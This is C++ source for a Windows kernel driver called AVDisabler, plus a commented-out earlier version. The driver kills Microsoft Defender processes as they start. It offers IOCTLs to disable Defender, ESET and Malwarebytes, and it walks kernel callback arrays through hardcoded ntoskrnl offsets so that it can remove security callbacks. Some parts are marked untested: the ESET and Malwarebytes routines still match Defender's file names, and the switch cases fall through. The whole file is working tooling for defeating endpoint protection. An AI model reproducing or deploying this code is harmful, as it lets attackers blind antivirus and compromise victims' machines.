	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: Base Address of PspCreateThreadNotifyRoutine: 0x%p\n", *PspCreateThreadNotifyRoutine));

	//CallbackIndex = 2; // Image type
	CallbackIndex = 0;
	PspEnumerateCallback(2, &CallbackIndex, PspLoadImageNotifyRoutine);
	if (!(*PspLoadImageNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: PspLoadImageNotifyRoutine address is 0x0,\neither there is no load image callback routines or there is a bug\n"));
		status = STATUS_INVALID_ADDRESS;
		return status;
	}

	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: Base Address of PspLoadImageNotifyRoutine: 0x%p\n", *PspLoadImageNotifyRoutine));

	//Added!!!
	ULONG_PTR PspCreateProcessCallbackRoutineBaseAddress = PspCreateProcessCallbackRoutine;
	ULONG_PTR PspCreateThreadCallbackRoutineBaseAddress = PspCreateThreadCallbackRoutine;
	ULONG_PTR PspLoadImageCallbackRoutineBaseAddress = PspLoadImageCallbackRoutine;

	KdPrint(("\n"));

	while (*(ULONG_PTR**)PspCreateProcessCallbackRoutine != (ULONG_PTR)0x0 ||
		*(ULONG_PTR**)PspCreateThreadCallbackRoutine != (ULONG_PTR)0x0 ||
		*(ULONG_PTR**)PspLoadImageCallbackRoutine != (ULONG_PTR)0x0)
	{
		if (*(ULONG_PTR**)PspCreateProcessCallbackRoutine == (ULONG_PTR)0x0 &&
			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
		{
			PspCreateThreadCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateThreadCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == (ULONG_PTR)0x0 &&
			*(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0 &&
			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == (ULONG_PTR)0x0 &&
			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
			*(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspCreateThreadCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspCreateThreadCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspCreateProcessCallbackRoutine != 0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspCreateProcessCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0)
		{
			PspCreateThreadCallbackRoutine += 0x8;
			PspCreateThreadCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspCreateThreadCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspCreateProcessCallbackRoutine == 0x0 &&
			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
		{
			PspLoadImageCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutineCount++;
		}

		else if (*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0 &&
			*(ULONG_PTR**)PspCreateThreadCallbackRoutine != 0x0 &&
			*(ULONG_PTR**)PspLoadImageCallbackRoutine != 0x0)
		{
			PspCreateProcessCallbackRoutine += 0x8;
			PspCreateThreadCallbackRoutine += 0x8;
			PspLoadImageCallbackRoutine += 0x8;

			PspCreateProcessCallbackRoutineCount++;
			PspCreateThreadCallbackRoutineCount++;
			PspLoadImageCallbackRoutineCount++;
		}
	}

	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutineCount: %d\n", PspCreateProcessCallbackRoutineCount));
	KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutineCount: %d\n", PspCreateThreadCallbackRoutineCount));
	KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutineCount: %d\n", PspLoadImageCallbackRoutineCount));

	KdPrint(("\n"));

	/*needs to be tested*/
	ULONG_PTR* PspCreateProcessCallbackRoutinesArray = (ULONG_PTR*)ExAllocatePool(NonPagedPool, 8 * PspCreateProcessCallbackRoutineCount);
	ULONG_PTR* PspCreateThreadCallbackRoutinesArray = (ULONG_PTR*)ExAllocatePool(NonPagedPool, 8 * PspCreateThreadCallbackRoutineCount);
	ULONG_PTR* PspLoadImageCallbackRoutinesArray = (ULONG_PTR*)ExAllocatePool(NonPagedPool, 8 * PspLoadImageCallbackRoutineCount);

	for (int i = 0; i < PspCreateProcessCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateProcessCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateProcessCallbackRoutineBaseAddress)));
		PspCreateProcessCallbackRoutinesArray[i] = *(ULONG_PTR*)(PspCreateProcessCallbackRoutineBaseAddress); // casting might need to be *(ULONG_PTR**)(PspCreateProcessCallbackRoutineBaseAddress);
		PspCreateProcessCallbackRoutineBaseAddress += 0x8;
	}

	KdPrint(("\n"));

	for (int i = 0; i < PspCreateThreadCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry: PspCreateThreadCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspCreateThreadCallbackRoutineBaseAddress)));
		PspCreateThreadCallbackRoutinesArray[i] = *(ULONG_PTR*)(PspCreateThreadCallbackRoutineBaseAddress); // casting might need to be *(ULONG_PTR**)(PspCreateThreadCallbackRoutineBaseAddress);
		PspCreateThreadCallbackRoutineBaseAddress += 0x8;
	}

	KdPrint(("\n"));

	for (int i = 0; i < PspLoadImageCallbackRoutineCount; i++)
	{
		KdPrint(("[*] AVDisabler::DriverEntry: PspLoadImageCallbackRoutine[%d]: 0x%p\n", i, *(ULONG_PTR**)(PspLoadImageCallbackRoutineBaseAddress)));
		PspLoadImageCallbackRoutinesArray[i] = *(ULONG_PTR*)(PspLoadImageCallbackRoutineBaseAddress); // casting might need to be *(ULONG_PTR**)(PspLoadImageCallbackRoutineBaseAddress);
		PspLoadImageCallbackRoutineBaseAddress += 0x8;
	}

	status = TerminateCallbackRoutines(PspCreateProcessCallbackRoutinesArray, PspCreateThreadCallbackRoutinesArray, PspLoadImageCallbackRoutinesArray);
	if (!NT_SUCCESS(status))
		KdPrint(("AVDisabler::DriverEntry: Error in TerminateCallbackRoutines: NTSTATUS: 0x%x\n", status));

	return STATUS_SUCCESS;
}

void PreventEsetProcessCreate(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventEsetProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));

	// checking if the process being created is one of ESET's processes
	// 
	// ---------- !!!!!need to modify the processes' variables to ESET images names!!!!! ----------
	UNICODE_STRING ImageFileName;
	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return;
	}
	// checking if the process being created is one of Eset's processes
	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventEsetProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventEsetProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
	}
}

void PreventMalwareBytesProcessCreate(PEPROCESS Process,
	HANDLE ProcessId,
	PPS_CREATE_NOTIFY_INFO CreateInfo)
{

	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hProcess = nullptr;

	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
	KdPrint(("[+]AVDisablerDriver::PreventMalwareBytesProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));

	// checking if the process being created is one of Malwarebyte's processes
	// 
	// ---------- !!!!!need to modify the processes' variables to Malwarebytes images names!!!!! ----------
	UNICODE_STRING ImageFileName;
	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return;
	}
	// checking if the process being created is one of MalwareBytes's processes
	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
	{
		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
			return;
		}

		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject the PEPROCESS to avoid memory leak
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::PreventMalwareBytesProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
			return;
		}

		KdPrint(("[+] AVDisabler::PreventMalwareBytesProcessCreated: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));

	}
}

NTSTATUS CompleteRequest(NTSTATUS status, PIRP Irp, ULONG_PTR information)
{
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, 0);

	return status;
}


NTSTATUS CreateCloseDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	return CompleteRequest(STATUS_SUCCESS, Irp, 0);
}

NTSTATUS IOCTLHandlerDispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	char OutputBuffer[256];

	switch (IoStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_DISABLE_DEFENDER:
	{
		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...

		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
		{
			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_DEFENDER: invalid size of input buffer!\n"));
			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
		}

		status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, FALSE);

		if (!NT_SUCCESS(status))
		{
			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Failed to set Defender's process creation callback routine\n (NTSTATUS: 0x%x)", status);
			KdPrint((OutputBuffer));
			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
			return CompleteRequest(status, Irp, sizeof(OutputBuffer));
		}

		g_IsDefenderCallbackRoutineSet = TRUE;
		KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_DEFENDER: Process creation callback routine was created successfully!\n"));
	}

	case IOCTL_DISABLE_ESET:
	{
		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
		{
			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_ESET: invalid size of input buffer!\n"));
			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);
		}

		status = PsSetCreateProcessNotifyRoutineEx(PreventEsetProcessCreate, FALSE);
		if (!NT_SUCCESS(status))
		{
			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_ESET: Failed to set ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
			KdPrint((OutputBuffer));
			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
			return CompleteRequest(status, Irp, 0);
		}
		g_IsEsetCallbackRoutineSet = TRUE;
		KdPrint(("[+] AVDsiablerDriver::IOCTL_DISABLE_ESET: Process creation callback routine was created successfully!\n"));

	}

	case IOCTL_DISABLE_MALWAREBYTES:
	{
		ULONG_PTR InputBufferLength = IoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		ULONG_PTR OutputBufferLength = IoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
		PVOID SystemBuffer = Irp->AssociatedIrp.SystemBuffer; // use only if needed...
		if (InputBufferLength < sizeof(UNICODE_STRING) && OutputBufferLength < 256)
		{
			KdPrint(("AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: invalid size of input buffer!\n"));
			return CompleteRequest(STATUS_INSUFFICIENT_RESOURCES, Irp, 0);

		}

		status = PsSetCreateProcessNotifyRoutineEx(PreventMalwareBytesProcessCreate, FALSE);
		if (!NT_SUCCESS(status))
		{
			sprintf(OutputBuffer, "[-] AVDsiablerDriver::IOCTL_DISABLE_MALWAREBYTES: Failed to set MalwareByte's related process creation callback routine\n (NTSTATUS: 0x%x)", status);
			KdPrint((OutputBuffer));
			memcpy_s(SystemBuffer, OutputBufferLength, OutputBuffer, OutputBufferLength);
			return CompleteRequest(status, Irp, 0);
		}
		g_IsMalwareBytesCallbackRoutineSet = TRUE;
		KdPrint(("[+] AVDisablerDriver::IOCTL_DISABLE_MALWAREBYTES: Process creation callback routine was created successfully!\n"));
	}
	}

	return CompleteRequest(status, Irp, 0);
}

VOID UnloadRoutine(PDRIVER_OBJECT DriverObject)
{
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	if (g_IsDefenderCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, TRUE);
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset Defender's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	if (g_IsEsetCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(PreventEsetProcessCreate, TRUE);
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset ESET's related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	if (g_IsMalwareBytesCallbackRoutineSet)
	{
		status = PsSetCreateProcessNotifyRoutineEx(PreventMalwareBytesProcessCreate, TRUE); //<- needs to be defined first
		if (!NT_SUCCESS(status))
			KdPrint(("[-] AVDsiablerDriver::UnloadRoutine: Failed to unset MalwareBytes' related process creation callback routine\n (NTSTATUS: 0x%x)", status));
	}

	IoDeleteDevice(DeviceObject);
	status = IoDeleteSymbolicLink(&DeviceSymlink);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisablerDriver[Unload Routine]: couldn't delete symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceSymlink, status));
		return;
	}

	KdPrint(("[+] AVDisablerDriver[Unload Routine]: unload routine executed successfully!\n"));
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\AVDisabler");
	UNICODE_STRING DeviceSymlink = RTL_CONSTANT_STRING(L"\\??\\AVDisabler");

	UNICODE_STRING TestFullPath = RTL_CONSTANT_STRING(L"C:\\Users\\user\\test.txt");
	UNICODE_STRING a;
	status = GetFileNameFromPath(TestFullPath, &a);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
		return status;
	}

	KdPrint(("[+] AVDisabler::DriverEntry: GetFileNameFromPath was executed successfully and returned: %wZ", &a));

	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		return status;
	}
	KdPrint(("[+] AVDisabler::DriverEntry: Device %wZ was created successfully!\n", &DeviceName));

	status = IoCreateSymbolicLink(&DeviceSymlink, &DeviceName);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[*] Error creating device symlink %wZ (NTSTATUS: 0x%x)\n", &DeviceName, status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	KdPrint(("[+] AVDisabler::DriverEntry: Device symlink %wZ was created successfully!\n", &DeviceSymlink));
	status = PsSetCreateProcessNotifyRoutineEx(PreventDefenderProcessCreate, FALSE);
	g_IsDefenderCallbackRoutineSet = TRUE;
	if (!NT_SUCCESS(status))
		KdPrint(("AVDisabler::DriverEntry: Failed PsSetCreateProcessNotifyRoutineEx(): 0x%x\n", status));
	KdPrint(("AVDisabler::DriverEntry: PsSetCreateProcessNotifyRoutineEx() executed successfully!\n"));

	//status = EnumerateAVCallbackRoutinesBaseAddress(&PspCreateProcessCallbackRoutine, &PspCreateThreadCallbackRoutine, &PspLoadImageCallbackRoutine);

	KdPrint(("\n"));

	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseDispatchRoutine;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOCTLHandlerDispatchRoutine;
	DriverObject->DriverUnload = UnloadRoutine;

	KdPrint(("AVDisabler::DriverEntry: Initialization completed successfully!\n"));

	return status;
}

//#include <ntddk.h>
////#include "CallbackRegistrations.h"
//#include <Stdio.h>
//
//
//#define DeviceType 0x8001
//#define PROCESS_TERMINATE 1
//
//#define BYTE CHAR
//
//#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
//#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
//#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	
//
//BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01}; // first 10 opcodes
//
////TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
////	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...
//
//ULONG_PTR PspCreateProcessCallbackRoutine = 0;
//ULONG_PTR PspCreateThreadCallbackRoutine = 0;
//ULONG_PTR PspLoadImageCallbackRoutine = 0;
//
//typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
//	PVOID Object,
//	ULONG HandleAttributes,
//	PACCESS_STATE PassedAccessState,
//	ACCESS_MASK DesiredAccess,
//	POBJECT_TYPE ObjectType,
//	KPROCESSOR_MODE AccessMode,
//	PHANDLE Handle);
//
//
////Add more....
//UNICODE_STRING DefenderMsMpEng = RTL_CONSTANT_STRING(L"MsMpEng.exe");
//UNICODE_STRING DefenderSecurityHealthService = RTL_CONSTANT_STRING(L"SecurityHealthService.exe");
//UNICODE_STRING DefenderSecurityHealthSystray = RTL_CONSTANT_STRING(L"SecurityHealthSystray.exe");
//UNICODE_STRING DefenderSecurityHealthHost = RTL_CONSTANT_STRING(L"SecurityHealthHost.exe");
//UNICODE_STRING DefenderSecHealthUI = RTL_CONSTANT_STRING(L"SecHealthUI.exe");
//
//BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
//BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
//BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;
//
//
//NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* FileName)
//{
//	// Check for valid input parameters
//	if (FullPath.Buffer == NULL || FileName == NULL)
//	{
//		return STATUS_INVALID_PARAMETER;
//	}
//
//	// Special case handling for "C:\" or similar paths
//	if (FullPath.Length == 4 && FullPath.Buffer[0] == L'C' && FullPath.Buffer[1] == L':' && FullPath.Buffer[2] == L'\\')
//	{
//		// For "C:\", consider it as the root, so no file name
//		FileName->Buffer = FullPath.Buffer + 3;  // Skip the "C:\"
//		FileName->Length = 0;                    // No file name after the backslash
//		FileName->MaximumLength = FullPath.MaximumLength;
//		return STATUS_SUCCESS;
//	}
//
//	// Start from the end of the FullPath string
//	PWSTR pBackslash = NULL;
//	for (PWSTR p = FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1; p >= FullPath.Buffer; p--)
//	{
//		if (*p == L'\\') // Found the last backslash
//		{
//			pBackslash = p;
//			break;
//		}
//	}
//
//	if (pBackslash == NULL)
//	{
//		// No backslash found, so the whole path is the filename
//		FileName->Buffer = FullPath.Buffer;
//		FileName->Length = FullPath.Length;
//		FileName->MaximumLength = FullPath.MaximumLength;
//	}
//	else
//	{
//		// Set FileName to point after the last backslash
//		FileName->Buffer = pBackslash + 1;
//		FileName->Length = (USHORT)((FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1) - pBackslash) * sizeof(WCHAR);
//		FileName->MaximumLength = FileName->Length + sizeof(WCHAR);  // Plus the null terminator
//	}
//
//	return STATUS_SUCCESS;
//}
//
//
//void PreventDefenderProcessCreate(PEPROCESS Process,
//								  HANDLE ProcessId,
//								  PPS_CREATE_NOTIFY_INFO CreateInfo)
//{
//	NTSTATUS status = STATUS_SUCCESS;
//	HANDLE hProcess = nullptr;
//
//	UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
//	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
//	KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));
//	
//	UNICODE_STRING ImageFileName;
//	status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
//	if (!NT_SUCCESS(status))
//	{
//		KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
//		return;
//	}
//	// checking if the process being created is one of defender's processes
//	if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
//		RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
//	{
//		status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
//		status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject() the PEPROCESS to avoid memory leak
//		if (!NT_SUCCESS(status))
//		{
//			KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
//			//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
//			return;
//		}
//
//		KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));
//		
//	}
//}
//
//VOID GetPspEnumerateCallbackBaseAddress(ULONG_PTR* PspEnumerateCallbackBaseAddress) 
//{
//	/*
//		Need here to implement a function that reads the whole content of ntoskrnl.exe into a memory buffer
//		Then, compare every 10 opcodes with the PspEnumerateCallback opcodes, whenever there is a match,
//		return the base address/offset from base address into PspEnumerateCallbackBaseAddress
//	*/
//
//	return;
//}
//
//NTSTATUS TerminateAVCallbackRoutines(ULONG_PTR* PspCreateProcessNotifyRoutine,
//									 ULONG_PTR* PspCreateThreadNotifyRoutine,
//									 ULONG_PTR* PspLoadImageNotifyRoutine)
//{
//	/*
//		----Needs to be tested!!!---
//
//		PspEnumerateCallback needs to be resolved differently!!!
//	*/
//
//	typedef int(NTAPI* pPspEnumerateCallback)(
//		int ObjectTypeRoutineArrayIndex,
//		DWORD32* PCallbackIndex,
//		ULONG_PTR* TargetRoutineBaseAddress);
//	
//	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
//	//pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)MmGetSystemRoutineAddress(&PspEnumerateCallbackName);
//	UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");
//	ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
//	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));
//
//	PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
//	KdPrint(("[+] AVDisabler::TerminateAVCallbackRoutines: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));
//
//	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
//	if(!PspEnumerateCallback)
//	{
//		KdPrint(("[-] AVDisabler::TerminateAVCallbackRoutines: Couldn't resolve PspEnumerateCallback address\n"));
//		return STATUS_INVALID_ADDRESS;
//	}
//	KdPrint(("[*] AVDisabler::TerminateAVCallbackRoutines: PspEnumerateCallback address at: 0x%p\n", PspEnumerateCallback));
//	
//	DWORD32 CallbackIndex = 0;
//	//DWORD32 CallbackIndex = 1; // Process type
//	PspEnumerateCallback(1, &CallbackIndex, PspCreateProcessNotifyRoutine);
